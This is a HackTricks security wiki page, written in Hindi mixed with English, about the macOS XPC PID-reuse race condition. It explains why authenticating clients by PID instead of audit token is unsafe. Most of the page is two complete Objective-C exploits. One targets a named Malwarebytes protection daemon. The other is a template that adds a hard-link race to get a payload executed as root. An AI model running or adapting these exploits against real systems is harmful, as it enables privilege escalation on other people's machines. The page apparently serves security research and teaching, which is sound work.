# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

जब macOS **XPC service** called process को **PID** के आधार पर check करती है, **audit token** के आधार पर नहीं, तो वह PID reuse attack के लिए vulnerable होती है। यह attack एक **race condition** पर आधारित है, जिसमें एक **exploit** **XPC** service को उसकी functionality का **abusing** करते हुए **messages भेजेगा** और **उसके तुरंत बाद** **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** को **allowed** binary के साथ execute करेगा।

यह function **allowed binary को PID का owner** बना देगा, लेकिन **malicious XPC message उससे ठीक पहले भेजा जा चुका होगा**। इसलिए, यदि **XPC** service sender को **authenticate** करने के लिए **PID** का **use** करती है और **`posix_spawn`** के execution के **AFTER** उसकी जांच करती है, तो वह समझेगी कि message किसी **authorized** process से आया है।

### Exploit example

यदि आपको **`shouldAcceptNewConnection`** function या उसके द्वारा call किया गया कोई function मिलता है, जो **`processIdentifier`** को **call** करता है और **`auditToken`** को call नहीं करता, तो इसका अत्यधिक संभावित अर्थ है कि वह audit token के बजाय **process PID verify** कर रहा है।\
उदाहरण के लिए इस image में (reference से ली गई):

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

इस example exploit को check करें (फिर से, reference से लिया गया है) ताकि exploit के 2 parts देख सकें:

- एक जो कई forks **generate** करता है
- **Each fork** **payload** को XPC service पर **send** करेगा और message भेजने के तुरंत बाद **`posix_spawn`** execute करेगा।

> [!CAUTION]
> Exploit के काम करने के लिए ` export`` `` `**`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** करना या exploit के अंदर इसे डालना महत्वपूर्ण है:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
**`NSTasks`** और बच्चों को launch करने वाले argument का use करके RC exploit करने का पहला option.
```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

// send the XPC messages
NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
xpcConnection.remoteObjectInterface = remoteInterface;

[xpcConnection resume];
[xpcConnection.remoteObjectProxy restartOS];

char target_binary[] = BINARY;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

NSString *exec = [[NSBundle mainBundle] executablePath];
NSTask *processes[RACE_COUNT];

for (int i = 0; i < RACE_COUNT; i++) {
processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
}

int i = 0;
struct timespec ts = {
.tv_sec = 0,
.tv_nsec = 500 * 1000000,
};

nanosleep(&ts, NULL);
if (++i > 4) {
for (int i = 0; i < RACE_COUNT; i++) {
[processes[i] terminate];
}
return false;
}

return true;
}

int main(int argc, const char * argv[]) {

if(argc > 1) {
// called from the NSTasks
child();

} else {
NSLog(@"Starting the race");
create_nstasks();
}

return 0;
}
```
{{#endtab}}

{{#tab name="fork"}}
यह उदाहरण **PID race condition** का exploit करने वाले **children** को launch करने के लिए raw **`fork`** का उपयोग करता है और फिर **Hard link** के माध्यम से एक अन्य race condition का exploit करता है:
```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
* XPC service verify the legit binary and then execute as root out payload.
*/
void *check_race(void *arg) {
while(!pwned) {
// Overwrite with contents of the legit binary
system("cat ./legit_bin > hard_link");
usleep(50000);

// Overwrite with contents of the payload to execute
// TODO: COMPILE YOUR OWN PAYLOAD BIN
system("cat ./payload > hard_link");
usleep(50000);
}
return NULL;
}

void child_xpc_pid_rc_abuse(){
// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
extern char **environ;

// Connect with XPC service
// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
NSString*  service_name = @"com.example.Helper";
NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
// TODO: CNAGE THE PROTOCOL NAME
NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
NSLog(@"[-] Something went wrong");
NSLog(@"[-] Error: %@", error);
}];

NSLog(@"obj: %@", obj);
NSLog(@"conn: %@", connection);

// Call vulenrable XPC function
// TODO: CHANEG NAME OF FUNCTION TO CALL
[obj DoSomething:^(_Bool b){
NSLog(@"Response, %hdd", b);
}];

// Change current process to the legit binary suspended
char target_binary[] = kValid;
char *target_argv[] = {target_binary, NULL};
posix_spawnattr_t attr;
posix_spawnattr_init(&attr);
short flags;
posix_spawnattr_getflags(&attr, &flags);
flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
posix_spawnattr_setflags(&attr, flags);
posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
* Function to perform the PID race condition using children calling the XPC exploit.
*/
void xpc_pid_rc_abuse() {
#define RACE_COUNT 1
extern char **environ;
int pids[RACE_COUNT];

// Fork child processes to exploit
for (int i = 0; i < RACE_COUNT; i++) {
int pid = fork();
if (pid == 0) {  // If a child process
child_xpc_pid_rc_abuse();
}
printf("forked %d\n", pid);
pids[i] = pid;
}

// Wait for children to finish their tasks
sleep(3);

// Terminate child processes
for (int i = 0; i < RACE_COUNT; i++) {
if (pids[i]) {
kill(pids[i], 9);
}
}
}

int main(int argc, const char * argv[]) {
// Create and set execution rights to 'hard_link' file
system("touch hard_link");
system("chmod +x hard_link");

// Create thread to exploit sign verification RC
pthread_t thread;
pthread_create(&thread, NULL, check_race, NULL);

while(!pwned) {
// Try creating 'download' directory, ignore errors
system("mkdir download 2>/dev/null");

// Create a hardlink
// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
system("ln hard_link download/legit_bin");

xpc_pid_rc_abuse();
usleep(10000);

// The payload will generate this file if exploitation is successfull
if (access("/tmp/pwned", F_OK ) == 0) {
pwned = true;
}
}

return 0;
}
```
{{#endtab}}
{{#endtabs}}

## अन्य उदाहरण

- [**Intego X9: Why your macOS antivirus should not trust PIDs**](https://blog.quarkslab.com/intego_lpe_macos_2.html) - एक AV के privileged helper के विरुद्ध LPE, जिसने clients को PID के आधार पर authenticate किया।
- [**Exploiting GOG Galaxy XPC service for privilege escalation in macOS**](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [**Rootpipe Reborn (Part II)**](https://objective-see.org/blog/blog_0x41.html)

## संदर्भ

- [https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [https://blog.quarkslab.com/intego_lpe_macos_2.html](https://blog.quarkslab.com/intego_lpe_macos_2.html)
- [https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos](https://www.ibm.com/think/x-force/exploiting-gog-galaxy-xpc-service-privilege-escalation-macos)
- [https://objective-see.org/blog/blog_0x41.html](https://objective-see.org/blog/blog_0x41.html)

{{#include ../../../../../../banners/hacktricks-training.md}}
